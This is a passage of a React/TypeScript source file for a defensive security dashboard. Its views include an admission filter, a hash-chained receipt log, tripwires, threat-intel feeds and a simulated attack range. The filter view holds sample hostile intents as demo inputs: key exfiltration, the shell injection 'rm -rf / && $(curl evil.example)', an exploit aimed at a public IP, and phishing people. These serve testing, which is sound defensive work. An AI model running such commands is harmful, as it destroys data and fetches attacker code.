import { useEffect, useState } from "react";
import {
  Activity,
  Crosshair,
  Cpu,
  ExternalLink,
  Fingerprint,
  Ghost,
  Lock,
  Map,
  Network,
  Radio,
  Share2,
  Shield,
  Skull,
  Swords,
  Terminal,
} from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { briefThreat } from "@/lib/immune/feeds";
import { HUKLLA_REGISTRY, WATCHER_FRAMEWORKS } from "@/lib/immune/huklla";
import { LEADERS, MESH_ORGANS, GRAPH_EDGES, OP_COPY } from "@/lib/immune/doctrine";
import { ACTOR_CLUSTERS, CANARIES, INFERENCE_RADAR, UNIQUE_GAPS } from "@/lib/immune/radar";
import { FIELD_CELLS, FIELD_HUNTS } from "@/lib/immune/field";
import { DOSSIERS, LIVE_CHAIN, RANGE_CHAIN } from "@/lib/immune/ghost";
import { listSentraSignatures } from "@/lib/immune/sentra";
import { useImmune } from "@/lib/immune/store";
import type { CounterOp, Provenance } from "@/lib/immune/types";
import { cn } from "@/lib/utils";

function toneFor(p: Provenance) {
  if (p === "LIVE") return "live" as const;
  if (p === "RANGE") return "range" as const;
  if (p === "UNAVAILABLE" || p === "STALE") return "danger" as const;
  if (p === "MODELED") return "modeled" as const;
  return "mute" as const;
}

export function ThreatRail() {
  const campaigns = useImmune((s) => s.campaigns);
  const selectedId = useImmune((s) => s.selectedId);
  const select = useImmune((s) => s.select);
  return (
    <aside className="hud-panel flex h-full min-h-0 flex-col overflow-hidden p-3 sm:p-4">
      <header className="mb-3 flex items-center justify-between">
        <p className="font-mono text-[10px] uppercase tracking-[0.22em] text-muted">Inbound objects</p>
        <span className="tabular font-mono text-[10px] text-primary">{campaigns.length}</span>
      </header>
      <div className="min-h-0 flex-1 space-y-2 overflow-y-auto pr-1">
        {campaigns.map((c) => (
          <button
            key={c.id}
            type="button"
            onClick={() => select(c.id)}
            className={cn(
              "w-full rounded-md border px-3 py-3 text-left transition-colors",
              selectedId === c.id ? "border-primary bg-primary/10" : "border-border bg-bg-subtle hover:border-border-strong",
            )}
          >
            <div className="flex items-center justify-between gap-2">
              <span className="text-sm font-medium">{c.name}</span>
              <Badge tone={toneFor(c.provenance)}>{c.provenance}</Badge>
            </div>
            <p className="mt-1 font-mono text-[10px] uppercase tracking-wider text-muted">
              {c.actor} · {c.status}
            </p>
          </button>
        ))}
      </div>
    </aside>
  );
}

export function Inspector() {
  const selectedId = useImmune((s) => s.selectedId);
  const campaigns = useImmune((s) => s.campaigns);
  const nodes = useImmune((s) => s.nodes);
  const runOp = useImmune((s) => s.runOp);
  const lastCycle = useImmune((s) => s.lastCycle);
  const briefing = useImmune((s) => s.briefing);
  const briefingBusy = useImmune((s) => s.briefingBusy);
  const setBriefing = useImmune((s) => s.setBriefing);
  const setBriefingBusy = useImmune((s) => s.setBriefingBusy);
  const campaign = campaigns.find((c) => c.id === selectedId);
  const node = nodes.find((n) => n.id === selectedId);

  if (!campaign && !node) {
    return (
      <aside className="hud-panel flex h-full min-h-0 flex-col overflow-y-auto p-4">
        <p className="font-mono text-[10px] uppercase tracking-[0.22em] text-muted">Inspector</p>
        <p className="mt-4 text-sm text-muted">Select a node on the globe or an inbound object. Authority stays fail-closed until you act.</p>
      </aside>
    );
  }

  const ops = Object.keys(OP_COPY) as CounterOp[];

  return (
    <aside className="hud-panel flex h-full min-h-0 flex-col overflow-y-auto p-3 sm:p-4">
      <p className="font-mono text-[10px] uppercase tracking-[0.22em] text-muted">Inspector</p>
      <h2 className="mt-2 text-lg font-semibold tracking-tight">{campaign?.name ?? node?.name}</h2>
      <div className="mt-2 flex flex-wrap gap-1.5">
        <Badge tone={toneFor((campaign?.provenance ?? node?.provenance) as Provenance)}>
          {campaign?.provenance ?? node?.provenance}
        </Badge>
        {campaign && <Badge tone="mute">{campaign.atlas}</Badge>}
        {campaign && <Badge tone="mute">{campaign.owasp}</Badge>}
      </div>
      <p className="mt-3 text-sm text-muted">{campaign?.summary ?? node?.summary}</p>

      {campaign && (
        <>
          <p className="mt-5 font-mono text-[10px] uppercase tracking-[0.22em] text-muted">Authorized effectors</p>
          <p className="mt-1 text-xs text-subtle">
            STRIKE never leaves the RANGE. Live KEV items accept isolate, hunt, patch only.
          </p>
          <div className="mt-3 flex flex-wrap gap-2">
            {ops.map((op) => {
              const meta = OP_COPY[op];
              const blocked = op === "STRIKE" && !campaign.rangeOnly;
              return (
                <Button
                  key={op}
                  size="sm"
                  variant={op === "STRIKE" ? "danger" : "outline"}
                  disabled={blocked}
                  onClick={() => void runOp(op, campaign.id)}
                  className="h-10 px-3 text-[11px]"
                >
                  {meta.title}
                </Button>
              );
            })}
          </div>
          <Button
            className="mt-3 w-full"
            variant="ghost"
            disabled={briefingBusy}
            onClick={async () => {
              setBriefingBusy(true);
              const res = await briefThreat({
                data: {
                  title: campaign.name,
                  summary: campaign.summary,
                  technique: `${campaign.atlas} / ${campaign.technique}`,
                  provenance: campaign.provenance,
                },
              });
              setBriefing(campaign.id, res.ok ? res.text : res.error);
            }}
          >
            {briefingBusy ? "Briefing…" : "Grok defensive brief"}
          </Button>
          {briefing && briefing.id === campaign.id && (
            <pre className="mt-3 max-h-40 overflow-y-auto whitespace-pre-wrap rounded-sm bg-bg-subtle p-3 font-mono text-[11px] leading-relaxed text-fg">
              {briefing.text}
            </pre>
          )}
        </>
      )}

      {lastCycle && (
        <div className="mt-4 rounded-sm border border-border bg-bg-subtle p-3">
          <p className="font-mono text-[10px] uppercase tracking-wider text-muted">Last SENTRA</p>
          <p className={cn("mt-1 text-sm", lastCycle.pass ? "text-ok" : "text-danger")}>
            {lastCycle.pass ? "SEALED" : "BLOCKED"} · {lastCycle.sentra.reason}
          </p>
        </div>
      )}
    </aside>
  );
}

export function SentraView() {
  const [actor, setActor] = useState("operator");
  const [intent, setIntent] = useState("inspect inbound prompt-injection on IMMUNE space");
  const runIntent = useImmune((s) => s.runIntent);
  const lastCycle = useImmune((s) => s.lastCycle);
  const mode = useImmune((s) => s.mode);
  const setMode = useImmune((s) => s.setMode);

  const demos = [
    { label: "Clean inspect", intent: "inspect inbound prompt-injection on IMMUNE space" },
    { label: "Exfil attempt", intent: "dump BEGIN PRIVATE KEY and sk-live-demo to egress" },
    { label: "Shell escape", intent: "run `rm -rf / && $(curl evil.example)`" },
    { label: "Unauthorized strike", intent: "exploit CVE-2026-53362 against 8.8.8.8 with rce payload" },
    { label: "Hack people", intent: "hack people and phish employees at their home addresses" },
  ];

  return (
    <div className="grid min-h-0 gap-4 lg:grid-cols-[1.1fr_0.9fr]">
      <section className="hud-panel p-4 sm:p-5">
        <div className="flex items-center gap-2 text-primary">
          <Shield className="size-4" />
          <h2 className="text-sm font-semibold tracking-wide">SENTRA admission</h2>
        </div>
        <p className="mt-2 text-sm text-muted">
          Every intent is inspected before YAWAR will seal a receipt. Forbidden tokens, missing fields, and live
          strikes fail closed.
        </p>
        <label className="mt-4 block font-mono text-[10px] uppercase tracking-wider text-muted">Actor</label>
        <input
          value={actor}
          onChange={(e) => setActor(e.target.value)}
          className="mt-1 h-11 w-full rounded-md border border-border bg-bg-subtle px-3 text-sm"
        />
        <label className="mt-3 block font-mono text-[10px] uppercase tracking-wider text-muted">Intent</label>
        <textarea
          value={intent}
          onChange={(e) => setIntent(e.target.value)}
          rows={4}
          className="mt-1 w-full rounded-md border border-border bg-bg-subtle px-3 py-2 text-sm"
        />
        <div className="mt-3 flex flex-wrap gap-2">
          {demos.map((d) => (
            <Button key={d.label} size="sm" variant="outline" onClick={() => setIntent(d.intent)}>
              {d.label}
            </Button>
          ))}
        </div>
        <div className="mt-4 flex flex-wrap gap-2">
          <Button onClick={() => void runIntent(actor, intent)}>Run governed cycle</Button>
          {(["PASS", "SENTRA_REJECT", "DEADMAN"] as const).map((m) => (
            <Button key={m} size="sm" variant={mode === m ? "default" : "outline"} onClick={() => setMode(m)}>
              {m === "DEADMAN" ? "Engage DEADMAN" : m}
            </Button>
          ))}
        </div>
      </section>
      <section className="hud-panel p-4 sm:p-5">
        <p className="font-mono text-[10px] uppercase tracking-wider text-muted">Signatures</p>
        <ul className="mt-3 space-y-2">
          {listSentraSignatures().map((s) => (
            <li key={s.name} className="rounded-sm bg-bg-subtle px-3 py-2">
              <p className="font-mono text-xs text-primary">{s.name}</p>
              <p className="text-xs text-muted">{s.detail}</p>
            </li>
          ))}
        </ul>
        {lastCycle && (
          <div className="mt-4 rounded-sm border border-border p-3">
            <p className={cn("font-semibold", lastCycle.pass ? "text-ok" : "text-danger")}>
              {lastCycle.pass ? "Accepted" : "Rejected"}
            </p>
            <p className="mt-1 font-mono text-[11px] text-muted">{lastCycle.sentra.reason}</p>
            <p className="mt-1 font-mono text-[10px] text-subtle">{lastCycle.sentra.signatureMatched}</p>
          </div>
        )}
      </section>
    </div>
  );
}

export function YawarView() {
  const chain = useImmune((s) => s.chain);
  const chainOk = useImmune((s) => s.chainOk);
  const tamperDemo = useImmune((s) => s.tamperDemo);
  const resetLedger = useImmune((s) => s.resetLedger);
  const entries = [...chain].reverse().slice(0, 24);

  return (
    <section className="hud-panel flex min-h-0 flex-col p-4 sm:p-5">
      <div className="flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-2 text-primary">
          <Lock className="size-4" />
          <h2 className="text-sm font-semibold tracking-wide">YAWAR receipt chain</h2>
        </div>
        <div className="flex gap-2">
          <Button size="sm" variant="outline" onClick={() => void tamperDemo()}>
            Tamper last receipt
          </Button>
          <Button size="sm" variant="ghost" onClick={() => void resetLedger()}>
            Reseal genesis
          </Button>
        </div>
      </div>
      <p className="mt-2 text-sm text-muted">
        Append-only SHA-256. Tamper any payload and re-verification breaks at that seq — the same principle as Sigstore
        Rekor, applied to agent actions.
      </p>
      <div className="mt-3">
        <Badge tone={chainOk ? "ok" : "danger"}>{chainOk ? "CHAIN VERIFIED" : "CHAIN BROKEN"}</Badge>
        <span className="ml-2 tabular font-mono text-xs text-muted">{chain.length} receipts</span>
      </div>
      <div className="mt-4 min-h-0 flex-1 space-y-2 overflow-y-auto">
        {entries.map((r) => (
          <article key={r.hash} className="rounded-sm border border-border bg-bg-subtle px-3 py-2">
            <div className="flex items-center justify-between gap-2 font-mono text-[10px] text-muted">
              <span>SEQ {r.seq}</span>
              <span>{r.ts.slice(11, 19)}</span>
            </div>
            <p className="mt-1 truncate font-mono text-[11px] text-primary">{r.hash}</p>
            <p className="mt-1 truncate text-xs text-muted">{String((r.payload as { intent?: string }).intent ?? "—")}</p>
          </article>
        ))}
      </div>
    </section>
  );
}

export function HukllaView() {
  const lastCycle = useImmune((s) => s.lastCycle);
  const fired = new Set(lastCycle?.huklla.filter((h) => h.fired).map((h) => h.id) ?? []);
  return (
    <section className="hud-panel p-4 sm:p-5">
      <div className="flex items-center gap-2 text-primary">
        <Radio className="size-4" />
        <h2 className="text-sm font-semibold tracking-wide">HUKLLA tripwires</h2>
      </div>
      <p className="mt-2 text-sm text-muted">
        Eleven watchers aligned to OWASP LLM Top 10 and MITRE ATLAS. Alignment is ours — not an official mapping. T11
        fires when an operator tries to target people.
      </p>
      <div className="mt-4 grid gap-2 sm:grid-cols-2">
        {HUKLLA_REGISTRY.map((t) => {
          const fw = WATCHER_FRAMEWORKS[t.id];
          const isFired = fired.has(t.id);
          return (
            <article
              key={t.id}
              className={cn(
                "rounded-md border px-3 py-3",
                isFired ? "border-danger bg-danger/10" : "border-border bg-bg-subtle",
              )}
            >
              <div className="flex items-center justify-between">
                <p className="font-mono text-xs text-primary">
                  {t.id} {t.name}
                </p>
                <Badge tone={isFired ? "danger" : t.severity === "critical" ? "danger" : "mute"}>
                  {isFired ? "FIRED" : t.severity}
                </Badge>
              </div>
              <p className="mt-1 text-xs text-muted">{t.description}</p>
              {fw && (
                <p className="mt-2 font-mono text-[10px] text-subtle">
                  {fw.owasp.id} · {fw.atlas.id} · {fw.note}
                </p>
              )}
            </article>
          );
        })}
      </div>
    </section>
  );
}

export function IntelView() {
  const feeds = useImmune((s) => s.feeds);
  const feedsError = useImmune((s) => s.feedsError);
  return (
    <div className="grid min-h-0 gap-4 lg:grid-cols-2">
      <section className="hud-panel flex min-h-0 flex-col p-4">
        <div className="flex items-center justify-between">
          <h2 className="text-sm font-semibold">CISA KEV</h2>
          <Badge tone={toneFor(feeds?.kev.provenance ?? "UNAVAILABLE")}>{feeds?.kev.provenance ?? "…"}</Badge>
        </div>
        <p className="mt-1 font-mono text-[10px] text-muted">
          catalog {feeds?.kev.catalogVersion ?? "—"} · {feeds?.kev.count ?? 0} known exploited
        </p>
        <div className="mt-3 min-h-0 flex-1 space-y-2 overflow-y-auto">
          {(feeds?.kev.items ?? []).map((k) => (
            <article key={k.cveID} className="rounded-sm border border-border bg-bg-subtle px-3 py-2">
              <div className="flex items-center justify-between gap-2">
                <p className="font-mono text-xs text-primary">{k.cveID}</p>
                <span className="font-mono text-[10px] text-muted">{k.dateAdded}</span>
              </div>
              <p className="mt-1 text-sm">{k.vulnerabilityName}</p>
              <p className="mt-1 text-xs text-muted">{k.shortDescription}</p>
            </article>
          ))}
          {!feeds && !feedsError && <p className="text-sm text-muted">Pulling live KEV…</p>}
          {feedsError && <p className="text-sm text-warn">Feed error: {feedsError}</p>}
        </div>
      </section>
      <section className="hud-panel p-4">
        <div className="flex items-center justify-between">
          <h2 className="text-sm font-semibold">Rekor transparency</h2>
          <Badge tone={toneFor(feeds?.rekor.provenance ?? "UNAVAILABLE")}>{feeds?.rekor.provenance ?? "…"}</Badge>
        </div>
        <p className="mt-3 font-mono text-xs text-muted">treeSize</p>
        <p className="tabular text-2xl font-semibold text-primary">
          {feeds?.rekor.treeSize?.toLocaleString() ?? "UNAVAILABLE"}
        </p>
        <p className="mt-2 truncate font-mono text-[11px] text-subtle">{feeds?.rekor.rootHash ?? "—"}</p>
        <p className="mt-4 text-sm text-muted">{feeds?.rekor.note}</p>
        <div className="mt-6">
          <h3 className="text-sm font-semibold">MITRE ATLAS case studies</h3>
          <p className="mt-1 text-xs text-muted">REFERENCE — real incidents, not claimed as our detections.</p>
          <ul className="mt-3 space-y-2 text-sm">
            <li>AML.CS0009 Tay poisoning</li>
            <li>AML.CS0016 MathGPT prompt injection → code execution</li>
            <li>AML.CS0003 Cylance classifier evasion</li>
            <li>AML.CS0000 C2 detector evasion</li>
          </ul>
          <a
            className="mt-3 inline-flex items-center gap-1 text-sm text-primary"
            href="https://atlas.mitre.org/"
            target="_blank"
            rel="noreferrer"
          >
            atlas.mitre.org <ExternalLink className="size-3.5" />
          </a>
        </div>
      </section>
      <section className="hud-panel p-4 lg:col-span-2">
        <h2 className="text-sm font-semibold">Actor clusters — hunt behaviors, not people</h2>
        <p className="mt-1 text-xs text-muted">
          Public MITRE groups and campaigns only. No biographies. Detection signature names. Never strike people.
        </p>
        <div className="mt-3 grid gap-2 md:grid-cols-2">
          {ACTOR_CLUSTERS.map((a) => (
            <article key={a.id} className="rounded-md border border-border bg-bg-subtle p-3">
              <div className="flex items-center justify-between gap-2">
                <p className="font-mono text-xs text-primary">{a.id}</p>
                <span className="font-mono text-[10px] uppercase tracking-wider text-muted">{a.category}</span>
              </div>
              <p className="mt-1 text-sm">{a.aliases}</p>
              <p className="mt-1 text-xs text-muted">{a.techniques}</p>
              <p className="mt-2 font-mono text-[10px] text-subtle">{a.hunt}</p>
            </article>
          ))}
        </div>
      </section>
    </div>
  );
}

export function EstateView() {
  const feeds = useImmune((s) => s.feeds);
  const pokeCanary = useImmune((s) => s.pokeCanary);
  const lastCanary = useImmune((s) => s.lastCanary);
  const spaces = feeds?.estate.spaces ?? [];
  const broken = spaces.filter((s) => {
    const stage = (s.stage ?? "").toUpperCase();
    return stage.includes("ERROR") || stage === "STOPPED" || stage === "PAUSED";
  });
  const running = spaces.filter((s) => (s.stage ?? "").toUpperCase() === "RUNNING").length;
  const groups = [
    { title: "Models", items: feeds?.estate.models ?? [] },
    { title: "Spaces", items: spaces },
    { title: "Datasets", items: feeds?.estate.datasets ?? [] },
    { title: "GitHub", items: feeds?.estate.repos ?? [] },
  ];
  return (
    <section className="hud-panel min-h-0 overflow-y-auto p-4 sm:p-5">
      <div className="flex flex-wrap items-center justify-between gap-2">
        <div>
          <h2 className="text-sm font-semibold">SZLHOLDINGS estate pulse</h2>
          <p className="mt-1 text-sm text-muted">
            Live Hugging Face + GitHub. Spaces with BUILD_ERROR / RUNTIME_ERROR are quarantined from the live overlay.
            Provenance {feeds?.estate.provenance ?? "UNAVAILABLE"}.
          </p>
        </div>
        <Badge tone={toneFor(feeds?.estate.provenance ?? "UNAVAILABLE")}>{feeds?.estate.provenance ?? "…"}</Badge>
      </div>
      <p className="mt-2 font-mono text-[11px] text-muted">
        org szl-holdings · public repos {feeds?.github.publicRepos ?? "—"} · spaces {running} running · {broken.length}{" "}
        failing
      </p>
      {broken.length > 0 && (
        <div className="mt-4 rounded-md border border-danger/40 bg-danger/10 p-3">
          <p className="font-mono text-[10px] uppercase tracking-wider text-danger">Quarantine · fail-closed</p>
          <ul className="mt-2 space-y-1.5">
            {broken.map((item) => (
              <li key={item.id} className="flex items-center justify-between gap-2 text-sm">
                <span className="truncate">{item.id.replace("SZLHOLDINGS/", "")}</span>
                <Badge tone="danger">{item.stage}</Badge>
              </li>
            ))}
          </ul>
        </div>
      )}
      <div className="mt-4 rounded-md border border-border bg-bg-subtle p-3">
        <p className="font-mono text-[10px] uppercase tracking-wider text-muted">GHOST.LATTICE.CANARY</p>
        <p className="mt-1 text-xs text-muted">
          Decoys. Real Spaces never share context. A touch is a P1 hunt sealed on YAWAR — not a low-sev log.
        </p>
        <div className="mt-3 grid gap-2 sm:grid-cols-3">
          {CANARIES.map((c) => (
            <button
              key={c.id}
              type="button"
              onClick={() => void pokeCanary(c.id)}
              className="rounded-md border border-border bg-bg px-3 py-3 text-left hover:border-primary"
            >
              <p className="text-sm font-medium">{c.name}</p>
              <p className="mt-1 text-xs text-muted">{c.bait}</p>
            </button>
          ))}
        </div>
        {lastCanary && (
          <p className="mt-2 font-mono text-[10px] text-primary">
            trip {lastCanary.id} · {lastCanary.hash ? lastCanary.hash.slice(0, 16) : lastCanary.reason}
          </p>
        )}
      </div>
      <div className="mt-4 grid gap-4 lg:grid-cols-2">
        {groups.map((g) => (
          <div key={g.title}>
            <p className="font-mono text-[10px] uppercase tracking-wider text-muted">
              {g.title} · {g.items.length}
            </p>
            <ul className="mt-2 space-y-1.5">
              {g.items.slice(0, 16).map((item) => {
                const stage = (item.stage ?? "").toUpperCase();
                const fail = stage.includes("ERROR");
                return (
                  <li key={item.id} className="flex items-center justify-between gap-2 rounded-sm bg-bg-subtle px-3 py-2">
                    <span className="truncate text-sm">{item.id.replace("SZLHOLDINGS/", "").replace("szl-holdings/", "")}</span>
                    <span className="shrink-0 font-mono text-[10px] text-muted">
                      {fail ? item.stage : item.sdk ?? item.pipeline ?? item.language ?? (item.downloads != null ? `${item.downloads} dl` : item.stage ?? "")}
                    </span>
                  </li>
                );
              })}
            </ul>
          </div>
        ))}
      </div>
    </section>
  );
}

export function RadarView() {
  const bindEngine = useImmune((s) => s.bindEngine);
  const lastBind = useImmune((s) => s.lastBind);
  const lastCycle = useImmune((s) => s.lastCycle);
  const verbs = ["BIND", "WRAP", "WATCH", "IGNORE"] as const;
  return (
    <div className="grid min-h-0 gap-4 lg:grid-cols-[1.15fr_0.85fr]">
      <section className="hud-panel min-h-0 overflow-y-auto p-4">
        <div className="flex items-center gap-2 text-primary">
          <Cpu className="size-4" />
          <h2 className="text-sm font-semibold">Inference radar · 2026-08-29</h2>
        </div>
        <p className="mt-2 text-sm text-muted">
          BIND = native adapter, receipts on every completion. WRAP = OpenAI-compat proxy, untrusted foreign compute.
          WATCH = stub, no SLO. IGNORE = do not spend cycles. TGI is archived. Closed APIs never bind.
        </p>
        {lastBind && (
          <p className="mt-3 rounded-sm border border-border bg-bg-subtle px-3 py-2 font-mono text-[11px] text-primary">
            Channel B {lastBind.verb} {lastBind.name} · {lastBind.pass ? "SEALED" : "REFUSED"} ·{" "}
            {lastBind.hash ? lastBind.hash.slice(0, 16) : lastBind.reason}
          </p>
        )}
        <div className="mt-4 space-y-4">
          {verbs.map((verb) => (
            <div key={verb}>
              <p className="font-mono text-[10px] uppercase tracking-wider text-muted">{verb}</p>
              <ul className="mt-2 space-y-1.5">
                {INFERENCE_RADAR.filter((e) => e.verb === verb).map((e) => (
                  <li key={e.name} className="rounded-md border border-border bg-bg-subtle px-3 py-2">
                    <div className="flex items-center justify-between gap-2">
                      <a href={e.url} target="_blank" rel="noreferrer" className="text-sm font-medium text-fg hover:text-primary">
                        {e.name}
                      </a>
                      <span className="font-mono text-[10px] text-muted">{e.license}</span>
                    </div>
                    <p className="mt-1 text-xs text-muted">{e.line}</p>
                    <p className="mt-1 text-xs text-fg">{e.note}</p>
                    <Button
                      size="sm"
                      variant={verb === "IGNORE" ? "danger" : "outline"}
                      className="mt-2"
                      onClick={() => void bindEngine(e.name)}
                    >
                      {verb === "BIND" ? "Mint receipt" : verb === "WRAP" ? "Stamp opaque" : verb === "WATCH" ? "Watch only" : "Refuse bind"}
                    </Button>
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </div>
      </section>
      <section className="hud-panel min-h-0 overflow-y-auto p-4">
        <p className="font-mono text-[10px] uppercase tracking-wider text-muted">Unoccupied intersection</p>
        <p className="mt-2 text-sm text-muted">
          Doctrine v11 LOCKED compiles to a WASM cell. LLM is Λ = Conjecture 1 — advisory, never holds keys. Evidence
          class is a protocol field. Nobody else ships this.
        </p>
        <div className="mt-3 rounded-md border border-border bg-bg-subtle p-3">
          <p className="font-mono text-[10px] text-primary">IMMUNE.COMPILER.SIGNED_KERNEL · dual channel</p>
          <p className="mt-2 text-xs text-muted">
            Channel A (LLM) may brief. Channel B (this cell) is the only writer on YAWAR. A cannot veto B. Minting a BIND
            receipt is Channel B — no model I/O required.
          </p>
          {lastCycle && (
            <p className="mt-2 font-mono text-[10px] text-muted">
              last cycle {lastCycle.pass ? "PASS" : "REFUSED"} · {lastCycle.sentra.signatureMatched ?? "—"}
            </p>
          )}
        </div>
        <div className="mt-4 space-y-3">
          {UNIQUE_GAPS.map((g) => (
            <article key={g.id} className="rounded-md border border-border bg-bg-subtle p-3">
              <p className="font-mono text-[10px] text-primary">{g.name}</p>
              <p className="mt-2 text-xs text-muted">{g.take}</p>
              <p className="mt-2 text-xs text-fg">{g.tweak}</p>
            </article>
          ))}
        </div>
      </section>
    </div>
  );
}

export function FieldView() {
  const compileCell = useImmune((s) => s.compileCell);
  const huntField = useImmune((s) => s.huntField);
  const lastField = useImmune((s) => s.lastField);
  return (
    <div className="grid min-h-0 gap-4 lg:grid-cols-[1.15fr_0.85fr]">
      <section className="hud-panel min-h-0 overflow-y-auto p-4">
        <div className="flex items-center gap-2 text-primary">
          <Map className="size-4" />
          <h2 className="text-sm font-semibold">Field · compiled from public Ukraine COP doctrine</h2>
        </div>
        <p className="mt-2 text-sm text-muted">
          Map-first. Cloud-exile. Dissimilar path. Cell isolation. Taken from Delta, CERT-UA, and Strategy 3.0 —
          independently implemented. SENTRA blocks kill-zone and strike-drone language. Never people.
        </p>
        {lastField && (
          <p className="mt-3 rounded-sm border border-border bg-bg-subtle px-3 py-2 font-mono text-[11px] text-primary">
            Channel B {lastField.verb} {lastField.id} · {lastField.pass ? "SEALED" : "REFUSED"} ·{" "}
            {lastField.hash ? lastField.hash.slice(0, 16) : lastField.reason}
          </p>
        )}
        <div className="mt-4 space-y-3">
          {FIELD_CELLS.map((cell) => (
            <article key={cell.id} className="rounded-md border border-border bg-bg-subtle p-3">
              <div className="flex items-center justify-between gap-2">
                <p className="font-mono text-[10px] text-primary">{cell.name}</p>
                <span className="font-mono text-[10px] uppercase tracking-wider text-muted">{cell.verb}</span>
              </div>
              <p className="mt-2 text-xs text-muted">{cell.take}</p>
              <p className="mt-2 text-xs text-fg">{cell.tweak}</p>
              <Button size="sm" className="mt-3 min-h-11" onClick={() => void compileCell(cell.id)}>
                Compile {cell.verb.toLowerCase()}
              </Button>
            </article>
          ))}
        </div>
      </section>
      <section className="hud-panel min-h-0 overflow-y-auto p-4">
        <p className="font-mono text-[10px] uppercase tracking-wider text-muted">Hunt packs · behaviors not people</p>
        <p className="mt-2 text-sm text-muted">
          Public MITRE / CERT-UA / Trend Micro. RANGE twins only. A live grid is out of authority.
        </p>
        <div className="mt-3 space-y-3">
          {FIELD_HUNTS.map((h) => (
            <article key={h.id} className="rounded-md border border-border bg-bg-subtle p-3">
              <div className="flex items-center justify-between gap-2">
                <p className="font-mono text-xs text-primary">{h.id}</p>
                <span className="font-mono text-[10px] uppercase tracking-wider text-muted">{h.cluster}</span>
              </div>
              <p className="mt-1 text-sm">{h.aliases}</p>
              <p className="mt-1 text-xs text-muted">{h.campaign}</p>
              <p className="mt-2 font-mono text-[10px] text-subtle">{h.hunt}</p>
              <p className="mt-2 text-xs text-muted">{h.note}</p>
              <Button size="sm" variant="outline" className="mt-3 min-h-11" onClick={() => void huntField(h.id)}>
                Hunt RANGE twin
              </Button>
            </article>
          ))}
        </div>
        <p className="mt-6 font-mono text-[10px] uppercase tracking-wider text-muted">Unoccupied intersection</p>
        <p className="mt-2 text-xs text-muted">
          Delta ships a kill zone. We ship Channel B. The map, the exile, and the hunt signatures are ours. The strike
          is not.
        </p>
      </section>
    </div>
  );
}

export function RangeView() {
  const campaigns = useImmune((s) => s.campaigns);
  const ops = useImmune((s) => s.ops);
  const runOp = useImmune((s) => s.runOp);
  const sweepInbound = useImmune((s) => s.sweepInbound);
  const [sweeping, setSweeping] = useState(false);
  const range = campaigns.filter((c) => c.rangeOnly);
  const inbound = range.filter((c) => c.status === "inbound").length;
  return (
    <div className="grid min-h-0 gap-4 lg:grid-cols-[1.1fr_0.9fr]">
      <section className="hud-panel min-h-0 overflow-y-auto p-4">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <div className="flex items-center gap-2 text-primary">
            <Swords className="size-4" />
            <h2 className="text-sm font-semibold">White-hat RANGE</h2>
          </div>
          <Button
            size="sm"
            variant="danger"
            disabled={sweeping || inbound === 0}
            onClick={() => {
              setSweeping(true);
              void sweepInbound().finally(() => setSweeping(false));
            }}
          >
            {sweeping ? "Sweeping…" : `Sweep inbound (${inbound})`}
          </Button>
        </div>
        <p className="mt-2 text-sm text-muted">
          Attack the things that attack us — inside a governed range. Simulated adversary infrastructure only. No packets
          are emitted at the public internet. Live KEV items stay defensive.
        </p>
        <div className="mt-4 space-y-3">
          {range.map((c) => (
            <article key={c.id} className="rounded-md border border-border bg-bg-subtle p-3">
              <div className="flex items-center justify-between gap-2">
                <p className="font-medium">{c.name}</p>
                <Badge tone={c.status === "collapsed" ? "ok" : "range"}>{c.status}</Badge>
              </div>
              <p className="mt-1 text-xs text-muted">{c.summary}</p>
              <div className="mt-3 flex flex-wrap gap-2">
                {(["INTERDICT", "DECEIVE", "STRIKE"] as CounterOp[]).map((op) => (
                  <Button key={op} size="sm" variant={op === "STRIKE" ? "danger" : "outline"} onClick={() => void runOp(op, c.id)}>
                    {OP_COPY[op].title}
                  </Button>
                ))}
              </div>
            </article>
          ))}
        </div>
      </section>
      <section className="hud-panel min-h-0 overflow-y-auto p-4">
        <p className="font-mono text-[10px] uppercase tracking-wider text-muted">Ops log · sealed by YAWAR</p>
        <ul className="mt-3 space-y-2">
          {ops.length === 0 && <li className="text-sm text-muted">No counter-ops yet.</li>}
          {ops.map((o) => (
            <li key={o.id} className="rounded-sm border border-border px-3 py-2">
              <div className="flex items-center justify-between gap-2">
                <span className="font-mono text-xs text-primary">{o.op}</span>
                <Badge tone={o.result === "SEALED" ? "ok" : "danger"}>{o.result}</Badge>
              </div>
              <p className="mt-1 text-xs text-muted">{o.reason}</p>
              {o.receiptHash && <p className="mt-1 truncate font-mono text-[10px] text-subtle">{o.receiptHash}</p>}
            </li>
          ))}
        </ul>
      </section>
    </div>
  );
}

export function GhostView() {
  const campaigns = useImmune((s) => s.campaigns);
  const sessions = useImmune((s) => s.sessions);
  const terminal = useImmune((s) => s.terminal);
  const selectedId = useImmune((s) => s.selectedId);
  const select = useImmune((s) => s.select);
  const runKillChain = useImmune((s) => s.runKillChain);
  const enterDive = useImmune((s) => s.enterDive);
  const authorize = useImmune((s) => s.authorize);
  const openEchoTheater = useImmune((s) => s.openEchoTheater);
  const commandBusy = useImmune((s) => s.commandBusy);
  const selected = campaigns.find((c) => c.id === selectedId) ?? campaigns.find((c) => c.rangeOnly);
  const dossier = DOSSIERS.find((d) => d.campaignId === selected?.id);
  const chain = selected?.rangeOnly ? RANGE_CHAIN : LIVE_CHAIN;

  return (
    <div className="grid min-h-0 gap-4 lg:grid-cols-[1fr_1fr]">
      <section className="hud-panel min-h-0 overflow-y-auto p-4">
        <div className="flex items-center gap-2 text-primary">
          <Ghost className="size-4" />
          <h2 className="text-sm font-semibold">Ghost hunter</h2>
        </div>
        <p className="mt-2 text-sm text-muted">
          You hack the things that hack us — simulated C2 only. Type <span className="font-mono text-primary">authorize ghost</span>{" "}
          for a one-shot RANGE kill-chain that opens Echo theater. Type{" "}
          <span className="font-mono text-primary">dive ghost</span> to occupy RANGE infrastructure. Type{" "}
          <span className="font-mono text-danger">hack people</span> and SENTRA inverts the hunt: the intent becomes
          evidence.
        </p>
        <p className="mt-3 font-mono text-[10px] uppercase tracking-wider text-muted">RANGE sessions · no packets</p>
        <ul className="mt-2 space-y-2">
          {sessions.map((s) => (
            <li key={s.id}>
              <button
                type="button"
                onClick={() => select(s.campaignId)}
                className={cn(
                  "w-full rounded-md border px-3 py-2 text-left",
                  selectedId === s.campaignId ? "border-primary bg-primary/10" : "border-border bg-bg-subtle",
                )}
              >
